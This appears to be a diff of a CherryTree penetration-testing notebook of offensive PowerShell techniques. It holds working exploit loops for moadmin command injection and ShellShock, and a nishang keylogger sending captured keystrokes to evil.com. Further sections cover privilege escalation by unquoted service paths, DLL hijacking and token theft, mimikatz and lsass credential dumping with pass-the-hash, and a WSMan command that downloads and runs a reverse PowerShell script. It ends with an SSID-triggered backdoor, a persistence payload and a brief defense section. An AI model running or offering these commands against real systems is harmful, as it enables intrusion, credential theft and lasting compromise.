+while($cmd -ne &quot;exit&quot;)
+{
+    Write-Output &quot;MoAdminExploit&gt; &quot;
+    $cmd = Read-Host
+    function post_http ($url, $parameters)
+    {
+        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
+        $http_request.open(&quot;POST&quot;, $url, $false) 
+        $http_request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;) 
+        $http_request.setRequestHeader(&quot;Content-length&quot;, $parameters.length);
+        $http_request.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;) 
+        $http_request.send($parameters) 
+        $session=$http_request.responseText
+        $session
+    }
+
+post_http </rich_text>
+				<rich_text link="webs http://192.168.254.136/moadmin/moadmin.php">http://192.168.254.136/moadmin/moadmin.php</rich_text>
+				<rich_text> &quot;object=1;system('$cmd');exit&quot;
+}
+
+</rich_text>
+				<rich_text foreground="#ffffa5a50000" weight="heavy">ShellShock Exploit:</rich_text>
+				<rich_text>
+
+On web servers wherever you find cgi-bin/status available this exploit can be run on that server.
+
+
+$cmd = &quot;&quot;
+while($cmd -ne &quot;exit&quot;)
+{
+    Write-Output &quot;ShellShock&gt; &quot;
+    $cmd = Read-Host
+    function post_http ($url)
+    {
+        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
+        $http_request.open(&quot;POST&quot;, $url, $false) 
+        $http_request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;) 
+        $http_request.setRequestHeader(&quot;Content-length&quot;, $parameters.length);
+        $http_request.setRequestHeader(&quot;User-Agent&quot;, &quot;() { :; }; /bin/bash -c 'ping -c 1 192.168.254.1;$cmd' &quot;);
+        $http_request.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;) 
+        $session=$http_request.responseText
+        $session
+    }
+
+post_http </rich_text>
+				<rich_text link="webs http://192.168.254.145/cgi-bin/status">http://192.168.254.145/cgi-bin/status</rich_text>
+				<rich_text> 
+}
+
+Both the exploits are run using powershell scripting.
+
+Create Powershell Exploits in Metasploit: </rich_text>
+				<rich_text link="webs https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit</rich_text>
+				<rich_text>
+
+Example → add the ruby script in /opt/metasploit/modules/exploits/windows/smb/powershell_psexec.rb 
+
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Domain Enumeration" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593462532.03" ts_lastsave="1593780144.33" unique_id="20">
+			<rich_text>
+
+
+
+PowerView from powertools //recently moved to powersploit //
+
+
+• </rich_text>
+			<rich_text link="webs https://github.com/PowerShellEmpire/PowerTools">https://github.com/PowerShellEmpire/PowerTools</rich_text>
+			<rich_text> //download powerview folder
+• Import-Module .\powerview.psd1 // In the powerview folder , psd1 is the manifest file which loads all the modules and functions in current powershell session//
+• Get-Command -Module powerview
+• Get-NetDomainControllers //Get domain controllers for the current domain//
+• Get-NetComputers //Get all computers of the domain //
+• Get-NetUser //Get all users for the domain//
+• Get-NetUser –UserName Administrator //More details for the “Administrator” of the current domain //
+• Get-NetGroup //Get all the groups in a domain//
+• Get-NetFileServers  // Get all fileservers in domain//
+• Get-NetLoggedon –Hostname &lt;servername&gt; // Get all the users logged in machine //
+
+
+• Invoke-Netview //Find all machines on the current domain and enumerate various attributes//
+• Invoke-UserHunter //Find computers where a domain admin is logged in//
+• Invoke-ShareFinder //Find shares on hosts in current domain//
+• Invoke-FileFinder //Find sensitive files on computers in the domain//
+• Invoke-FindLocalAdminAcces //Find all machines on the current domain where the current user has local admin access //
+• Invoke-FindVulnSystems 
+• Invoke-HostEnum –Hostname domainpc //Run all enumeration on a particular computer//
+• Invoke-EnumerateLocalAdmins //Find local admins on all machines of the domain//
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Keylogger </rich_text>
+			<rich_text>
+
+In nishang : . .\nishang\Gather\Get-Information.ps1 \\Gets all the info about systems in domain \\
+In nishang : . .\nishang\Gather\Keylogger.ps1 \\Gets all the info about systems in domain \\
+. .\nishang\Gather\Keylogger.ps1 -CheckURL </rich_text>
+			<rich_text link="webs http://192.168.0.1/test/check.txt">http://192.168.0.1/test/check.txt</rich_text>
+			<rich_text> -MagicString stop123 //keylogger job keeps on running until it finds stop123 in check.txt file //
+** Job is started **
+**Type Anything **
+Keylogger logs data in User Temp directory in a key.txt file. \\it is encoded //
+. .\nishang\Utility\Parse_Keys.ps1
+Run Parse_Keys -Rawkeys .\key.txt -LoggedKeys .\output.txt // cat .\output.txt gives data captured from keylogger //
+
+We can exfiltrate the data to our C2C server :
+
+
+. .\nishang\Gather\Keylogger.ps1 -CheckURL </rich_text>
+			<rich_text link="webs http://192.168.0.1/test/check.txt">http://192.168.0.1/test/check.txt</rich_text>
+			<rich_text> -MagicString stop123  -exfil -ExfilOption Webserver -url </rich_text>
+			<rich_text link="webs https://evil.com/catch.php">https://evil.com/catch.php</rich_text>
+			<rich_text> 
+
+copy the encoded data received on the web server , use . .\nishang\Utility\Invoke-Decode.ps1 
+Invoke-Decode -EncodedData **paste the data received on web server ** → pass the data received from here to Parse_keys to get the actual content //
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Egress Testing </rich_text>
+			<rich_text>
+
+• Egress Traffic are connections that are initiated from within an organsiation / system to an external Internet host.
+• For egress testing we have . .\nishang\Gather\Firelistener.ps1 
+• FireListener -PortRange 100-200  //Starts listening on these ports  on attacker's machine//
+• . .\nishang\Gather\Firebuster.ps1 \\run it on victim machine \\
+•  Firebuster -targetip evil.com -PortRange 100-200 \\ connects to the attackers ports if allowed //
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Privilege Escalation " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593780207.86" ts_lastsave="1594011891.22" unique_id="21">
+			<rich_text>
+
+
+PowerUp  </rich_text>
+			<rich_text link="webs http://www.harmj0y.net/blog/powershell/powerup-ausage-guide/">http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/</rich_text>
+			<rich_text>  
+
+Import-Module .\powerup.psd1
+Get-Command -Module powerup
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Unquoted Service path | Add binaries to services</rich_text>
+			<rich_text>
+
+• Get-ServiceUnquoted //Get services with unquoted paths and a space in their name.//
+• </rich_text>
+			<rich_text link="webs https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/">https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/</rich_text>
+			<rich_text>
+• Invoke-ServiceAbuse -ServiceName ETDService -UserName viper -Password abc1234//Modify an unquoted service to add administrative user. //
+• Once you run the above command a user named “viper” with admin privileges will be created // net user viper → to check if created //
+• Run →  runas /user:viper cmd.exe  on a low privileged cmd shell and a new cmd shell will pop up with viper's admin privileges.
+
+• Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! //  Creates a new binary and backs up the actual service binary //
+• Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! // Make changes(adds shellcode or c# code ) in the same binary , doesn't create a new binary //
+• Sometimes services need to be stopped and restarted again to execute the above attacks using → **Invoke-ServiceStop** , **Invoke-ServiceStart** 
+
+
+For running all tests run → Invoke-allchecks 
+
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">Registry |MSI </rich_text>
+			<rich_text>
+
+
+• Get-RegAutoLogon  // Get User credentials stored accidently in registry //
+• Get-RegAlwaysInstallElevated // to check for elevated privileges to MSI packages → return true or false //
+• Write-UserAddMSI  //Run a MSI installer which can add admin user// → this would work only if the above registry key returned true.
+
+
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">DLLHijack </rich_text>
+			<rich_text>
+
+
+• Find-DLLHijack // D:\CherryTree\bin\cherrytree.exe                                            sahil.tikoo D:\CherryTree\bin\ntdll.dll  → This was one dll identified which could be used for hijacking in my machine //
+• Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles -ExcludeOwned // to exclude some system services and processes  and list processes with SYSTEM ownership//
+• Find-PathHijack | fl * // Get path of the all the services/processess where a dll can be implanted to gain higher privileges //
+•  Write-HijackDll -OutputFile 'D:\CherryTree\bin\\ntdll.dll' -Command 'net user tikoo 123456 /add' → This cmdlet is used to add a missing dll in cherry tree folder which was found to be writeable and when cherry tree is restarted this malicious dll executes creating a new user with SYSTEM privileges //
+
+
+This entire attack can be manually performed as well using process monitor by using filters to figure out missing Dll 's .
+
+In order to be able to escalate privileges via DLL hijacking the following conditions needs to be in place:
+• Write Permissions on a system folder
+• Software installation in a non-default directory
+• A service that is running as system and is missing a DLL
+• Restart of the service
+
+
+</rich_text>
+			<rich_text foreground="#ffffa5a50000" weight="heavy">TokenManipulation</rich_text>
+			<rich_text>
+
+We can find tokens of user logged in the machine and can impersonate those users.
+
+Import-Module .\powersploit\powersploit.psd1
+
+• Invoke-TokenManipulation -Enumerate
+• Invoke-TokenManipulation -CreateProcess “cmd.exe” -Username “ nt authority\system”  //cmd opens up with the system privileges //
+• ls hklm:\security // it will be accessible through system privileges //
+
+Get-process lsass | Invoke-TokenManipulation -ImpersonateUser // we can impersonate the privileges of the user with which lsass is running //
+
+
+
+
+
+
+
+
+
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Dump System Secrets" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593806022.19" ts_lastsave="1594023456.47" unique_id="22">
+			<rich_text>
+
+
+• Invoke-Mimikatz -DumpCreds // Mimikatz can only run with local admin privileges // → Powersploit
+• If above cmdlet doesn't work you can download mimikatz executable : </rich_text>
+			<rich_text link="webs https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</rich_text>
+			<rich_text> 
+• mimikatz # privilege::debug
+• mimikatz # sekurlsa::logonpasswords
+• sekurlsa::pth /user:Administrator /domain:provise /ntlm:{hash value}  // pass the hash //
+• PsExec.exe \\provise cmd.exe //sometimes the cmd opened using pth technique above wont show the actual user through whoami so use PSExec.exe //
+
+
+• procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp // we can use procdump tool from sysinternals to dump hashes //
+• Now we will load this lsass.dmp in mimikatz to extract credentials using minidump functionality of SEKURLSA module.
+• sekurlsa::minidump lsass.dmp
+
+
+• Invoke-Mimikatz -ComputerName PRVDXB113  -DumpCreds // to run mimikatz on remote machine //
+• Get-LSASecret // Dump LSA secret //  --&gt; runs in 32-bit powershell mode //The LSA secrets are stored under the HKLM:\Security\Policy\Secrets key. This key contains additional subkeys that store encrypted secrets and sometimes plaintext passwords//
+• . .\Get-PassHashes.ps1 → [nishang] → Get password hashes of all the users logged in the machine 
+• . .\Get-WLAN-Keys.ps1 → [nishang] → Get Wifi SSID with passwords for the machine 
+• . .\nishang\Gather\Copy-VSS.ps1
+• Copy-VSS -DestinationDir D:\ \\ It is used to fetch SAM , SYSTEM , ntds.dit keys in HKLM Hive \\ → nishang → crack SAM file using Cain tool 
+• Get-VaultCredentials OR Get-WebCredentials \\  fetch stored website credentials of users  in windows vault\\ → nishang
+• Get-GPPpassword → // Gets passwords of users stored in system.xml ,groups.xml located in DC only if accounts were created through group policy // → nishang { patched with KB2928120}
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Backdoor" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593832689.88" ts_lastsave="1593913607.18" unique_id="23">
+			<rich_text>
+
+
+
+Nishang Backdoor :
+
+• . .\nsihang\Backdoors\Gupt-Backdoor.ps1
+• Gupt-Backdoor -MagicString open -Verbose  // Run this backdoor cmdlet on victim's PC , it searches for an SSID with open in first4 strings and if 5th is “c” then the rest name of the SSID is executed on the victim's machine  for eg: opencwhoami  else if 5th character is “u” then the rest is treated as URL// 
+• SSID charactrs in name can only be 32 characters long , so you can use “u” as 5th character and work with URL's. 
+
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="POSHing the Hashes" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593913748.51" ts_lastsave="1593957012.82" unique_id="24">
+			<rich_text>
+
+
+POSHing the Hashes means replaying credentials or hashes to laterally move between machines in a domain.
+
+
+Replaying credentials: 
+
+• Mimikatz  //sekurlsa::pth /user:Administrator /domain:provise /ntlm:{hash value} // --&gt; pass the hash
+• File servers // File servers in a domain may contains some excel files with plaintext passwords //
+• Invoke-CredentialsPhish // phishing users //
+• Tokens  //Invoke-TokenManipulation //
+• Credential reuse // After dumping credentials from different machines , sometimes the same password work across different machine for other users as well //
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Remoting Revisited " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1593941425.08" ts_lastsave="1594065429.57" unique_id="25">
+			<rich_text>
+
+
+WinRM/WSMAN Command Execution:
+
+
+• Command Execution  Invoke-WSManAction -Action Create -ResourceURI wmicimv2/win32_process -ValueSet @{commandline=&quot;powershell.exe  -c Get-Process&quot;} -ComputerName domainpc –Credential domainpc/domain//This Invoke command won't return the actual result but instead a process ID to show that process was started so running Get-Process isn't quite helpful , it can be used in scenario where a user wants a backdoor using reverse shell //
+• Invoke-WSManAction -Action Create -ResourceURI wmicimv2/win32_process -ValueSet @{commandline=&quot;powershell.exe -c iex ((New-Object Net.Webclient).DownloadString('</rich_text>
+			<rich_text link="webs http://192.168.254.">http://192.168.254.</rich_text>
+			<rich_text> 1/reverse_powershell.ps1'))&quot;} -ComputerName domainpc –Credential domainpc/domain 
+
+
+WSMAN is firewall friendly as compared to powershell remoting and WMI and it can also be used to run commands on non windows boxes as well.
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Persistance" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594078480.62" ts_lastsave="1594086720.16" unique_id="26">
+			<rich_text>
+
+
+In Powersploit there is a cmdlet for persistance :
+
+./Powersploit/powersploit.psd1
+Get-Command -Module powersploit -→ gives one Add-persistance function 
+Get-Help Add-Persistence -examples
+
+Create your payload. This can come in the form of a scriptblock or a ps1 file.
+
+$persist = { iex (iwr http://bit.ly/e0Mw9w ) }
+
+Specify the desired limited-user persistence options:
+
+&gt;$UserOptions = New-UserPersistenceOption -Registry -AtLogon 
+
+Specify the desired elevated persistence options:
+
+&gt;$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -AtStartup
+
+Apply the persistence options to the persist payload. A persistence and removal script will be generated:
+
+Add-Persistence -ScriptBlock $persist -ElevatedPersistenceOptions $ElevatedOptions -UserPersistenceOptions $UserOptions -PassThru -Verbose
+
+Output:
+
+VERBOSE: Persistence script written to C:\Users\joe\Downloads\PowerSploit-new\Persistence\Persistence.ps1
+VERBOSE: Persistence removal script written to C:\Users\joe\Downloads\PowerSploit-new\Persistence\RemovePersistence.ps1
+
+You can now execute the powershell script with -persist during runtime for persistance.</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="True" name="Defense with Powershell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594086781.04" ts_lastsave="1594090575.34" unique_id="27">
+			<rich_text>
+
+
+ Controlling powershell:
+ 
+ •  Process tracking and Module logging. 
+ • ACL, Software Restriction Policies (SRP) and Application Control Policies (Applocker) could be used to control PowerShell. 
+
+ Applocker :</rich_text>
+			<rich_text link="webs https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview</rich_text>
+			<rich_text>
+ 
+ 
+ Just Enough Admin – Restrict Administrative Rights: </rich_text>
+			<rich_text link="webs https://docs.microsoft.com/en-us/archive/blogs/privatecloud/just-enough-administration-step-by-step">https://docs.microsoft.com/en-us/archive/blogs/privatecloud/just-enough-administration-step-by-step</rich_text>
+			<rich_text>
+ 
+ • Auditing, Base lining and Incident Management  
+ PoshSec - </rich_text>
+			<rich_text link="webs https://github.com/PoshSec">https://github.com/PoshSec</rich_text>
+			<rich_text>  
+ Kansa - </rich_text>
+			<rich_text link="webs https://github.com/davehull/Kansa">https://github.com/davehull/Kansa</rich_text>
+			<rich_text>  //It uses Powershell Remoting to run user contributed modules across hosts in an enterprise to collect data for use
+ during incident response, breach hunts, or for building an environmental
+ baseline.//
+ Voyeur - </rich_text>
+			<rich_text link="webs https://github.com/silverhack/voyeur/">https://github.com/silverhack/voyeur/</rich_text>
+			<rich_text>  //VOYEUR's main purpose is to automate several tasks of an Active Directory build review or security assessment. Also, the tool is able to create a fast (and pretty) Active Directory report //
+ Using Virus Total API - </rich_text>
+			<rich_text link="webs https://github.com/darkoperator/PoshVirusTotal">https://github.com/darkoperator/PoshVirusTotal</rich_text>
+			<rich_text>
+ 
+ 
+ </rich_text>
+		</node>
+	</node>
+</cherrytree>
